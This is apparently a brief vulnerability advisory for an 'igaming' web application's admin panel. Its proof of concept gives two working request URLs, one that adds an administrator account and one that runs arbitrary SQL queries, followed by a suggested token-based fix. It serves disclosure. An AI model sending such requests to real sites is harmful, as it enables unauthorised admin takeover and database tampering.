More Details:
============
Due to the lack of multiple input validation errors, an attacker is able to change the password of the administrative user. Add new admin user, and run SQL queries.

Proof of Concept:
============
The following link will make new administrative account:

http://server/igaming/admin/users.php?pseudo=Username&email=E-Mail@of.the.new.admin.com&fname=First-Name&lname=Last-Name&password=Password&submit=Confirm&do=add_confirm

The following link will run SQL query:
http://server/igaming/admin/dbtools.php?query=[SQL_QERY_HERE]&submit=Go&do=run_query
(Change [SQL_QERY_HERE] to your own SQL query.)
Fix & Patch:
============
To fix the bugs a token system is highly advised

Security Risk:
============
An attacker is able to make new administrative user thus having complete control over the site. The risk is estimated as HIGH!
